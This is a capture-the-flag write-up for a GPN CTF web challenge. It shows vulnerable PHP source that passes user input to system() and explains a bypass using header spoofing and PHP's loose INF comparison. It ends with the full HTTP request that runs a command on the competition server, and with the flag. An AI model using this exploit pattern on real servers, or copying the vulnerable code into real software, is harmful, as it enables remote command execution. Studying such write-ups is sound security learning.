# CTF Competition: GPN CTF

### CTF Name: Never gonna tell a lie and type you
**CTF Weight:** 141 points ~ 38 solves

![image](https://github.com/Mitchellzhou1/CyberPortfolio/assets/95938232/8b58f7f3-3123-4b7e-824e-137f8ebe2834)


## Writeup:
This challenge is about spoofing requests and flaws of the PHP comparisons.
We have been kindly provided the source code for the webpage:

```
<?php
       ini_set("display_errors",1);
       error_reporting(E_ALL);
//we tought about using passwords but you see everyone says they are insecure thus we came up with our own riddle.
function securePassword($user_secret){
    if ($user_secret < 10000){
        die("nope don't cheat");
    }
    $o = (integer) (substr(hexdec(md5(strval($user_secret))),0,7)*123981337);
    return $user_secret * $o ;
    
}
//this weird http parameter handling is old we use json 
$user_input = json_decode($_POST["data"]); 
//attention handling user data is dangerous
var_dump($user_input);

if ($_SERVER['HTTP_USER_AGENT'] != "friendlyHuman"){
    die("we don't tolerate toxicity");
}
    if($user_input->{'user'} === "admin🤠") {
        if ($user_input->{'password'} == securePassword($user_input->{'password'})  ){
            echo " hail admin what can I get you ". system($user_input->{"command"});
        }
        else {
            die("Skill issue? Maybe you just try  again?");
        }}
        else {
            echo "<html>";
            echo "<body>";
            echo "<h1>Welcome [to innovative Web Startup]</h1>";
            echo "<p> here we focus on the core values of each website. The backbone that carries the entire frontend</p><br><br>";
            echo "<blink>For this we only use old and trusty tools that are well documented and well tested</blink><br><br>";
            echo "<Big>That is not to say that we are not innovative, our authenticators are ahead of their time.</Big><br><br>";
           echo "<plaintext> to give you an teaser of our skills look at this example of commissioned work we build in a past project </plaintext>"; 
            
            echo system("fortune")."<br>";
        }
?>

```
Lets take a deeper look and see what we need to do:

1) Provide a data field in a `POST` request:
   ```$user_input = json_decode($_POST["data"]);```
   We can achieve this by adding the following into the HTTP request:
   ```
   POST / HTTP/1.1
   ...
   ...
   ...
   ...
   Content-Type: application/x-www-form-urlencoded
   data={}
   ```
   

2) spoof the HTTP_USER_AGENT to be `friendlyHuman`
3) set the user parameter in the data equal to `admin🤠`.
4) set the password of the parameter equal to `securePassword(password)`

   ```
   function securePassword($user_secret){
    if ($user_secret < 10000){
        die("nope don't cheat");
    }
    $o = (integer) (substr(hexdec(md5(strval($user_secret))),0,7)*123981337);
    return $user_secret * $o ;
    
    }
    ```
     looking at the securePassword function, it requires the password to be larger than 10000, then it turns the value into a string, MD5 hashes it, converts it to hexidecimal, substrings the first 7 digits, multiplies it by 123981337, and stores that value is `$o`.
     then that number is multiplied back with originial password as the final result.
     That's alot... and it will be very difficult to find a `$o` value. just passed on this logic, the `$o` value would need to be `1` in order for use to satisfy the requirement.

     The trick is that in php, if the number is greater than its maximum size, then it will default set it to `float(INF)`. Thus, I can just send in an extremely large number such that my input and the securePassword() function will both evaluate to be `float(INF)`.

5) Once, all these conditions pass, we are able to execute any commands through the command variable.

My final payload looked like this:
```
POST / HTTP/1.1
Host: the-sound-of-silence--matisyahu-0730.ctf.kitctf.de
Sec-Ch-Ua: "Chromium";v="125", "Not.A/Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: friendlyHuman
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 701

data={
"user": "admin🤠", 
"password": 99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999,
"command": "ls -la /"
}
```

![image](https://github.com/Mitchellzhou1/CyberPortfolio/assets/95938232/f92af4c6-4aa6-419c-be7e-fdc69bd46c2b)

the flag is `GPNCTF{1_4M_50_C0NFU53D_R1GHT_N0W}`

